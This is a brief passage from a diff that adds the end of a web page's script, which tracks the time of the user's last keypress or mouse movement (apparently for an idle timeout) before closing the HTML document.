+  const onActivity=()=>{lastActivity=Date.now();};
+  document.addEventListener('keydown',onActivity);
+  document.addEventListener('mousemove',onActivity);
+}
+</script>
+
+</body>
+</html>
